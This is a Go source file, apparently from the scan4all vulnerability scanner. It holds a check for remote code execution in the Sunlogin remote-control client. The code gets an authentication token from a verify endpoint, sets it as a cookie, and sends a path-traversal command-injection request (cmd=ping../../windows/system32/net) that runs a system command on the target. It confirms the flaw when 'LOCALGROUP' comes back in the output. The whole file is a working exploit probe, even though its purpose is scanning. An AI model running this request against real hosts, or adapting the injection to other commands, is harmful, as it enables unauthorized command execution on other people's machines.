package sunlogin

import (
	"encoding/json"
	"fmt"
	"github.com/hktalent/scan4all/pkg"
)

type res struct {
	Verify_string string `json:"verify_string"`
}

func SunloginRCE(url string) bool {
	if req, err := pkg.HttpRequset(url+"/cgi-bin/rpc?action=verify-haras", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && pkg.StrContains(req.Body, "verify_string") {
			res := res{}
			if err := json.Unmarshal([]byte(req.Body), &res); err != nil {
				return false
			}
			header := make(map[string]string)
			header["Cookie"] = "CID=" + res.Verify_string
			if req, err := pkg.HttpRequset(url+"/check?cmd=ping../../../../../../../../../../../windows/system32/net", "GET", "", false, header); err == nil {
				if req.StatusCode == 200 && pkg.StrContains(req.Body, "LOCALGROUP") {
					return true
				}
			}
			fmt.Println(res.Verify_string)
		}
	}
	return false
}
